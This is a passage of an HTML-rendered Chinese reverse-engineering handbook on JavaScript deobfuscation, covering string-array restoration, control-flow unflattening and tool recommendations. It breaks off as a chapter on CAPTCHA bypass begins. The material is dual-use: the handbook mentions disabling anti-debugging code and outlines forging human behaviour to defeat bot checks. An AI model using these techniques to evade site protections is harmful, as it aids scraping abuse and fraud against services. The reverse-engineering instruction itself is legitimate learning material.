<span class="nb">window</span><span class="p">.</span><span class="nx">decrypt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">_0x5678</span><span class="p">;</span>

<span class="c1">// ç„¶åå¯ä»¥æ‰¹é‡è§£å¯†</span>
<span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kd">let</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">10</span><span class="p">;</span><span class="w"> </span><span class="nx">i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">i</span><span class="p">,</span><span class="w"> </span><span class="nx">decrypt</span><span class="p">(</span><span class="nx">i</span><span class="p">));</span>
<span class="p">}</span>
</code></pre>
      </div>

      <hr />

      <h3 id="43-æå–å’Œé‡å†™">4.3 æå–å’Œé‡å†™</h3>

      <h4 id="ä¸‰å…ƒè¡¨è¾¾å¼å±•å¼€">ä¸‰å…ƒè¡¨è¾¾å¼å±•å¼€</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ··æ·†ä»£ç </span>
<span class="kd">var</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">b</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">d</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">e</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="nx">f</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="nx">g</span><span class="p">;</span>

<span class="c1">// æ”¹å†™ä¸º if-else</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">a</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">b</span><span class="p">;</span>
<span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">c</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">d</span><span class="p">;</span>
<span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">f</span><span class="p">;</span>
<span class="p">}</span><span class="w"> </span><span class="k">else</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">g</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="é€—å·è¡¨è¾¾å¼æ‹†åˆ†">é€—å·è¡¨è¾¾å¼æ‹†åˆ†</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ··æ·†ä»£ç </span>
<span class="kd">var</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">,</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="nx">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">b</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">c</span><span class="p">,</span><span class="w"> </span><span class="nx">d</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">2</span><span class="p">);</span>

<span class="c1">// æ‹†åˆ†ä¸º</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">1</span><span class="p">;</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">d</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">b</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">c</span><span class="p">;</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">d</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="mf">2</span><span class="p">;</span>
</code></pre>
      </div>

      <hr />

      <h2 id="5-åæ··æ·†å®æˆ˜æ¡ˆä¾‹">5. åæ··æ·†å®æˆ˜æ¡ˆä¾‹</h2>

      <h3 id="æ¡ˆä¾‹-1-obfuscatorio-å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸ">æ¡ˆä¾‹ 1: obfuscator.io å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸ</h3>

      <p><strong>æ··æ·†ä»£ç </strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">_0x4a5b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;aGVsbG8=&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;d29ybGQ=&#39;</span><span class="p">];</span>
<span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x3e7a90</span><span class="p">,</span><span class="w"> </span><span class="nx">_0x1c9f47</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">_0x5d8c12</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x2f8c1d</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">--</span><span class="nx">_0x2f8c1d</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">_0x3e7a90</span><span class="p">[</span><span class="s1">&#39;push&#39;</span><span class="p">](</span><span class="nx">_0x3e7a90</span><span class="p">[</span><span class="s1">&#39;shift&#39;</span><span class="p">]());</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">};</span>
<span class="w">    </span><span class="nx">_0x5d8c12</span><span class="p">(</span><span class="o">++</span><span class="nx">_0x1c9f47</span><span class="p">);</span>
<span class="p">}(</span><span class="nx">_0x4a5b</span><span class="p">,</span><span class="w"> </span><span class="mh">0x123</span><span class="p">));</span>
<span class="kd">var</span><span class="w"> </span><span class="nx">_0x5678</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x3e7a90</span><span class="p">,</span><span class="w"> </span><span class="nx">_0x1c9f47</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// ...è§£å¯†é€»è¾‘</span>
<span class="p">};</span>

<span class="nx">console</span><span class="p">[</span><span class="nx">_0x5678</span><span class="p">(</span><span class="s1">&#39;0x0&#39;</span><span class="p">)](</span><span class="nx">_0x5678</span><span class="p">(</span><span class="s1">&#39;0x1&#39;</span><span class="p">));</span>
</code></pre>
      </div>

      <p><strong>è¿˜åŸæ­¥éª¤</strong>:</p>

      <ol>
        <li><strong>æ‰§è¡Œåˆå§‹åŒ–ä»£ç </strong>ï¼ˆåœ¨ Consoleï¼‰:<br />
          <div class="codehilite"><br />
            <pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">_0x4a5b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="s1">&#39;aGVsbG8=&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;d29ybGQ=&#39;</span><span class="p">];</span>
<span class="p">(</span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x3e7a90</span><span class="p">,</span><span class="w"> </span><span class="nx">_0x1c9f47</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">_0x5d8c12</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x2f8c1d</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="o">&#8211;</span><span class="nx">_0x2f8c1d</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><br />
<span class="w">            </span><span class="nx">_0x3e7a90</span><span class="p"><a href="/span&gt;&lt;span class=&quot;nx&quot;&gt;_0x3e7a90&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;shift&#39;&lt;/span&gt;&lt;span class=&quot;p&quot;"></span><span class="s1">&#39;push&#39;</span><span class="p"></a>;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">};</span>
<span class="w">    </span><span class="nx">_0x5d8c12</span><span class="p">(</span><span class="o">++</span><span class="nx">_0x1c9f47</span><span class="p">);</span>
<span class="p">}(</span><span class="nx">_0x4a5b</span><span class="p">,</span><span class="w"> </span><span class="mh">0x123</span><span class="p">));</span><br />
</code></pre><br />
          </div>
        </li>
      </ol>

      <ol start="2">
        <li>
          <p><strong>æ‰§è¡Œè§£å¯†å‡½æ•°</strong>:</p>

          <div class="codehilite">
            <pre><span></span><code><span class="kd">var</span><span class="w"> </span><span class="nx">_0x5678</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">_0x3e7a90</span><span class="p">,</span><span class="w"> </span><span class="nx">_0x1c9f47</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// å¤åˆ¶å®Œæ•´çš„è§£å¯†å‡½æ•°ä»£ç </span>
<span class="p">};</span>

<span class="c1">// æµ‹è¯•</span>
<span class="nx">_0x5678</span><span class="p">(</span><span class="s1">&#39;0x0&#39;</span><span class="p">)</span><span class="w">  </span><span class="c1">// è¾“å‡º: &quot;log&quot;</span>
<span class="nx">_0x5678</span><span class="p">(</span><span class="s1">&#39;0x1&#39;</span><span class="p">)</span><span class="w">  </span><span class="c1">// è¾“å‡º: &quot;hello&quot;</span>
</code></pre>
          </div>
        </li>
        <li>
          <p><strong>æ‰¹é‡æ›¿æ¢</strong>:<br />
            ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æˆ– AST å·¥å…·å°†æ‰€æœ‰ <code>_0x5678('0x...')</code> æ›¿æ¢ä¸ºè§£å¯†åçš„å­—ç¬¦ä¸²</p>
        </li>
      </ol>

      <hr />

      <h3 id="æ¡ˆä¾‹-2-æ§åˆ¶æµå¹³å¦åŒ–è¿˜åŸ">æ¡ˆä¾‹ 2: æ§åˆ¶æµå¹³å¦åŒ–è¿˜åŸ</h3>

      <p><strong>æ··æ·†ä»£ç </strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">checkPassword</span><span class="p">(</span><span class="nx">pwd</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">_0x1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;2|0|3|1|4&#39;</span><span class="p">.</span><span class="nx">split</span><span class="p">(</span><span class="s1">&#39;|&#39;</span><span class="p">),</span><span class="w"> </span><span class="nx">_0x2</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">    </span><span class="k">while</span><span class="w"> </span><span class="p">(</span><span class="kc">true</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">switch</span><span class="w"> </span><span class="p">(</span><span class="nx">_0x1</span><span class="p">[</span><span class="nx">_0x2</span><span class="o">++</span><span class="p">])</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="o">:</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">pwd</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">8</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">            </span><span class="k">continue</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">:</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="sr">/[A-Z]/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">pwd</span><span class="p">))</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">            </span><span class="k">continue</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;2&#39;</span><span class="o">:</span>
<span class="w">            </span><span class="kd">var</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span>
<span class="w">            </span><span class="k">continue</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;3&#39;</span><span class="o">:</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="sr">/[0-9]/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">pwd</span><span class="p">))</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span>
<span class="w">            </span><span class="k">continue</span><span class="p">;</span>
<span class="w">        </span><span class="k">case</span><span class="w"> </span><span class="s1">&#39;4&#39;</span><span class="o">:</span>
<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">        </span><span class="k">break</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>
</code></pre>
      </div>

      <p><strong>è¿˜åŸæ­¥éª¤</strong>:</p>

      <ol>
        <li><strong>è¯†åˆ«çŠ¶æ€åºåˆ—</strong>: <code>'2|0|3|1|4'</code></li>
        <li><strong>æŒ‰é¡ºåºé‡ç»„ä»£ç </strong>:<br />
          <div class="codehilite"><br />
            <pre><span></span><code><span class="kd">function</span><span class="w"> </span><span class="nx">checkPassword</span><span class="p">(</span><span class="nx">pwd</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><br />
<span class="w">    </span><span class="kd">var</span><span class="w"> </span><span class="nx">result</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w">                    </span><span class="c1">// case &#39;2&#39;</span><br />
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">pwd</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mf">8</span><span class="p">)</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w">     </span><span class="c1">// case &#39;0&#39;</span><br />
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="sr">/[0-9]/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">pwd</span><span class="p">))</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"> </span><span class="c1">// case &#39;3&#39;</span><br />
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="sr">/[A-Z]/</span><span class="p">.</span><span class="nx">test</span><span class="p">(</span><span class="nx">pwd</span><span class="p">))</span><span class="w"> </span><span class="k">return</span><span class="w"> </span><span class="kc">false</span><span class="p">;</span><span class="w"> </span><span class="c1">// case &#39;1&#39;</span><br />
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">result</span><span class="p">;</span><span class="w">                        </span><span class="c1">// case &#39;4&#39;</span><br />
<span class="p">}</span><br />
</code></pre><br />
          </div>
        </li>
      </ol>

      <hr />

      <h2 id="6-åæ··æ·†æœ€ä½³å®è·µ">6. åæ··æ·†æœ€ä½³å®è·µ</h2>

      <h3 id="61-æ¸è¿›å¼åæ··æ·†">6.1 æ¸è¿›å¼åæ··æ·†</h3>

      <p>ä¸è¦è¯•å›¾ä¸€æ¬¡æ€§è¿˜åŸæ‰€æœ‰ä»£ç ï¼Œé‡‡ç”¨åˆ†å±‚ç­–ç•¥ï¼š</p>

      <ol>
        <li><strong>ç¬¬ä¸€å±‚ï¼šæ ¼å¼åŒ–</strong> - ä½¿ç”¨ Prettier ç¾åŒ–ä»£ç </li>
        <li><strong>ç¬¬äºŒå±‚ï¼šå­—ç¬¦ä¸²è¿˜åŸ</strong> - è¿˜åŸå­—ç¬¦ä¸²æ•°ç»„å’Œç¼–ç </li>
        <li><strong>ç¬¬ä¸‰å±‚ï¼šå¸¸é‡æŠ˜å </strong> - è®¡ç®—æ‰€æœ‰å¸¸é‡è¡¨è¾¾å¼</li>
        <li><strong>ç¬¬å››å±‚ï¼šæ­»ä»£ç åˆ é™¤</strong> - ç§»é™¤æ— æ•ˆåˆ†æ”¯</li>
        <li><strong>ç¬¬äº”å±‚ï¼šå˜é‡é‡å‘½å</strong> - èµ‹äºˆå˜é‡æœ‰æ„ä¹‰çš„åç§°</li>
        <li><strong>ç¬¬å…­å±‚ï¼šæ§åˆ¶æµè¿˜åŸ</strong> - å¤„ç†æ§åˆ¶æµå¹³å¦åŒ–ï¼ˆå¯é€‰ï¼‰</li>
      </ol>

      <h3 id="62-ä¿ç•™ä¸­é—´ç»“æœ">6.2 ä¿ç•™ä¸­é—´ç»“æœ</h3>

      <p>æ¯ä¸€æ­¥éƒ½ä¿å­˜æ–‡ä»¶ï¼š</p>

      <pre><code>obfuscated.js           // åŸå§‹
01_formatted.js         // æ ¼å¼åŒ–
02_strings_restored.js  // å­—ç¬¦ä¸²è¿˜åŸ
03_constants_folded.js  // å¸¸é‡æŠ˜å 
04_dead_code_removed.js // æ­»ä»£ç åˆ é™¤
05_final.js            // æœ€ç»ˆç‰ˆæœ¬
</code></pre>

      <h3 id="63-éªŒè¯æ­£ç¡®æ€§">6.3 éªŒè¯æ­£ç¡®æ€§</h3>

      <p>æ¯æ¬¡å˜æ¢åéƒ½è¦éªŒè¯ï¼š</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// åœ¨ Console ä¸­å¯¹æ¯”è¾“å‡º</span>
<span class="nb">eval</span><span class="p">(</span><span class="nx">åŸå§‹ä»£ç </span><span class="p">).</span><span class="nx">someFunction</span><span class="p">(</span><span class="nx">testInput</span><span class="p">)</span>
<span class="nb">eval</span><span class="p">(</span><span class="nx">è¿˜åŸä»£ç </span><span class="p">).</span><span class="nx">someFunction</span><span class="p">(</span><span class="nx">testInput</span><span class="p">)</span>
<span class="c1">// ä¸¤è€…åº”è¯¥è¿”å›ç›¸åŒç»“æœ</span>
</code></pre>
      </div>

      <h3 id="64-å…³æ³¨æ ¸å¿ƒé€»è¾‘">6.4 å…³æ³¨æ ¸å¿ƒé€»è¾‘</h3>

      <p>ä¸è¦æµªè´¹æ—¶é—´è¿˜åŸæ•´ä¸ªæ–‡ä»¶ï¼š</p>

      <ul>
        <li><strong>ç›®æ ‡æ˜ç¡®</strong>: åªè¿˜åŸåŠ å¯†/ç­¾åç›¸å…³å‡½æ•°</li>
        <li><strong>é»‘ç›’è°ƒç”¨</strong>: å¯¹äºå¤æ‚çš„è¾…åŠ©å‡½æ•°ï¼Œç›´æ¥è°ƒç”¨è€Œä¸æ˜¯ç†è§£</li>
        <li><strong>RPC ç­–ç•¥</strong>: å®åœ¨æ— æ³•è¿˜åŸï¼Œè€ƒè™‘é€šè¿‡ RPC è°ƒç”¨æµè§ˆå™¨æ‰§è¡Œ</li>
      </ul>

      <hr />

      <h2 id="7-å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ">7. å¸¸è§é—®é¢˜ä¸è§£å†³æ–¹æ¡ˆ</h2>

      <h3 id="q1-ast-å·¥å…·æŠ¥é”™-cannot-read-property-type">Q1: AST å·¥å…·æŠ¥é”™ &#8220;Cannot read property &#8216;type&#8217;&#8221;
      </h3>

      <p><strong>åŸå› </strong>: æŸä¸ªèŠ‚ç‚¹è¢«é”™è¯¯åœ°åˆ é™¤æˆ–æ›¿æ¢</p>

      <p><strong>è§£å†³</strong>: åœ¨æ›¿æ¢å‰æ£€æŸ¥èŠ‚ç‚¹æ˜¯å¦å­˜åœ¨</p>

      <div class="codehilite">
        <pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nx">t</span><span class="p">.</span><span class="nx">isIdentifier</span><span class="p">(</span><span class="nx">path</span><span class="p">.</span><span class="nx">node</span><span class="p">))</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="c1">// å®‰å…¨æ“ä½œ</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="q2-å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸåä»ç„¶æ˜¯ä¹±ç ">Q2: å­—ç¬¦ä¸²æ•°ç»„è¿˜åŸåä»ç„¶æ˜¯ä¹±ç </h3>

      <p><strong>åŸå› </strong>:</p>

      <ul>
        <li>å­—ç¬¦ä¸²ç»è¿‡å¤šé‡ç¼–ç ï¼ˆBase64 â†’ XOR â†’ ROT13ï¼‰</li>
        <li>è§£å¯†å‡½æ•°ä¾èµ–è¿è¡Œæ—¶åŠ¨æ€ç”Ÿæˆçš„å¯†é’¥</li>
      </ul>

      <p><strong>è§£å†³</strong>:</p>

      <ul>
        <li>åœ¨æµè§ˆå™¨ç¯å¢ƒä¸­æ‰§è¡Œåˆå§‹åŒ–ä»£ç </li>
        <li>ä½¿ç”¨ Node.js çš„ VM æ¨¡å—æ¨¡æ‹Ÿæµè§ˆå™¨ç¯å¢ƒ</li>
      </ul>

      <h3 id="q3-æ§åˆ¶æµå¹³å¦åŒ–æ— æ³•è‡ªåŠ¨è¿˜åŸ">Q3: æ§åˆ¶æµå¹³å¦åŒ–æ— æ³•è‡ªåŠ¨è¿˜åŸ</h3>

      <p><strong>åŸå› </strong>: çŠ¶æ€è·³è½¬ä½¿ç”¨åŠ¨æ€è®¡ç®—ï¼ˆéç®€å•å­—ç¬¦ä¸²ï¼‰</p>

      <p><strong>è§£å†³</strong>:</p>

      <ul>
        <li>æ‰‹åŠ¨è·Ÿè¸ªçŠ¶æ€è½¬ç§»</li>
        <li>ä½¿ç”¨åŠ¨æ€æ’æ¡©è®°å½•å®é™…æ‰§è¡Œè·¯å¾„</li>
        <li>æ¥å—éƒ¨åˆ†è¿˜åŸï¼Œå…³æ³¨å…³é”®ä»£ç å—</li>
      </ul>

      <h3 id="q4-åæ··æ·†åä»£ç æ— æ³•è¿è¡Œ">Q4: åæ··æ·†åä»£ç æ— æ³•è¿è¡Œ</h3>

      <p><strong>åŸå› </strong>:</p>

      <ul>
        <li>ä¸¢å¤±äº†å¿…è¦çš„ä¸Šä¸‹æ–‡ï¼ˆé—­åŒ…å˜é‡ï¼‰</li>
        <li>è‡ªæˆ‘é˜²å¾¡ä»£ç æ£€æµ‹åˆ°ä¿®æ”¹</li>
      </ul>

      <p><strong>è§£å†³</strong>:</p>

      <ul>
        <li>ä¿ç•™å®Œæ•´çš„ä½œç”¨åŸŸé“¾</li>
        <li>ç¦ç”¨åè°ƒè¯•ä»£ç ï¼ˆè§ <a href="#03-Basic-Recipes-debugging-techniques">è°ƒè¯•æŠ€å·§</a>ï¼‰</li>
      </ul>

      <hr />

      <h2 id="8-å·¥å…·ä¸èµ„æº">8. å·¥å…·ä¸èµ„æº</h2>

      <h3 id="æ¨èå·¥å…·">æ¨èå·¥å…·</h3>

      <table>
        <thead>
          <tr>
            <th>å·¥å…·</th>
            <th>ç”¨é€”</th>
            <th>é“¾æ¥</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>AST Explorer</strong></td>
            <td>å¯è§†åŒ– AST ç»“æ„</td>
            <td>https://astexplorer.net/</td>
          </tr>
          <tr>
            <td><strong>Babel REPL</strong></td>
            <td>æµ‹è¯• Babel è½¬æ¢</td>
            <td>https://babeljs.io/repl</td>
          </tr>
          <tr>
            <td><strong>webcrack</strong></td>
            <td>Webpack åæ··æ·†</td>
            <td>https://github.com/j4k0xb/webcrack</td>
          </tr>
          <tr>
            <td><strong>synchrony</strong></td>
            <td>è‡ªåŠ¨åæ··æ·†</td>
            <td>https://deobfuscate.relative.im/</td>
          </tr>
        </tbody>
      </table>

      <h3 id="å­¦ä¹ èµ„æº">å­¦ä¹ èµ„æº</h3>

      <ul>
        <li><a href="https://github.com/jamiebuilds/babel-handbook/blob/master/translations/en/plugin-handbook.md">Babel
            Plugin Handbook</a></li>
        <li><a href="#02-Tooling-ast-tools">AST è§£æå·¥å…·</a></li>
        <li><a href="#07-Scripts-deobfuscation-scripts">åæ··æ·†è„šæœ¬åˆé›†</a></li>
      </ul>

      <hr />

      <h2 id="9-æ€»ç»“">9. æ€»ç»“</h2>

      <p>JavaScript åæ··æ·†æ˜¯ä¸€é—¨è‰ºæœ¯ï¼Œéœ€è¦ç»“åˆï¼š</p>

      <ul>
        <li><strong>å·¥å…·</strong>: è‡ªåŠ¨åŒ–å¤„ç†é‡å¤æ€§å·¥ä½œ</li>
        <li><strong>æŠ€å·§</strong>: æ‰‹åŠ¨å¤„ç†ç‰¹æ®Šæƒ…å†µ</li>
        <li><strong>ç»éªŒ</strong>: å¿«é€Ÿè¯†åˆ«æ··æ·†ç±»å‹å’Œæ ¸å¿ƒé€»è¾‘</li>
        <li><strong>è€å¿ƒ</strong>: å¤æ‚æ··æ·†å¯èƒ½éœ€è¦æ•°å°æ—¶ä¹ƒè‡³æ•°å¤©</li>
      </ul>

      <p><strong>æ ¸å¿ƒåŸåˆ™</strong>:</p>

      <ol>
        <li>ä¸è¦è¿½æ±‚å®Œç¾è¿˜åŸï¼Œç†è§£æ ¸å¿ƒé€»è¾‘å³å¯</li>
        <li>å–„ç”¨åŠ¨æ€åˆ†æï¼Œç»“åˆé™æ€åæ··æ·†</li>
        <li>å»ºç«‹è‡ªå·±çš„å·¥å…·åº“å’Œè„šæœ¬é›†</li>
        <li>ä¿æŒå­¦ä¹ ï¼Œæ··æ·†æŠ€æœ¯åœ¨ä¸æ–­æ¼”è¿›</li>
      </ol>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#02-Tooling-ast-tools">AST è§£æå·¥å…·</a></li>
        <li><a href="#07-Scripts-deobfuscation-scripts">åæ··æ·†è„šæœ¬</a></li>
        <li><a href="#03-Basic-Recipes-debugging-techniques">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></li>
        <li><a href="#04-Advanced-Recipes-javascript-vm-protection">JavaScript è™šæ‹Ÿæœºä¿æŠ¤</a></li>
        <li><a href="#03-Basic-Recipes-dynamic-parameter-analysis">åŠ¨æ€å‚æ•°åˆ†æ</a></li>
      </ul>

    </div>

    <div class="section" id="04-Advanced-Recipes-captcha-bypass">
      <h2>33. CAPTCHA Bypass</h2>
      <h1 id="éªŒè¯ç -captcha-ç»•è¿‡">éªŒè¯ç  (CAPTCHA) ç»•è¿‡</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>CAPTCHA (Completely Automated Public Turing test to tell Computers and Humans Apart)
        æ˜¯åŒºåˆ†äººç±»å’Œæœºå™¨äººçš„å›¾çµæµ‹è¯•ã€‚ä»æœ€æ—©çš„æ–‡å­—è¾“å…¥ï¼Œåˆ°åæ¥çš„æ»‘å—æ‹¼å›¾ï¼Œå†åˆ°ç°åœ¨çš„ç‚¹é€‰ã€è¡Œä¸ºåˆ†æå’Œæ— æ„ŸéªŒè¯ï¼ŒéªŒè¯ç æŠ€æœ¯åœ¨ä¸æ–­æ¼”è¿›ã€‚</p>

      <p><strong>é€†å‘éªŒè¯ç çš„æ ¸å¿ƒ</strong>ï¼šç†è§£éªŒè¯é€»è¾‘ã€è¯†åˆ«å›¾åƒå†…å®¹ã€æ¨¡æ‹Ÿäººç±»è¡Œä¸ºã€‚</p>

      <p><strong>æŠ€æœ¯è·¯çº¿</strong>ï¼š</p>

      <ol>
        <li><strong>è¯†åˆ«</strong> (Recognition)ï¼šOCRã€æ·±åº¦å­¦ä¹ ã€ç¼ºå£æ£€æµ‹</li>
        <li><strong>æ¨¡æ‹Ÿ</strong> (Simulation)ï¼šè½¨è¿¹ç”Ÿæˆã€è¡Œä¸ºä¼ªé€ </li>
        <li><strong>ç ´è§£</strong> (Bypass)ï¼šåè®®åˆ†æã€å‚æ•°ä¼ªé€ </li>
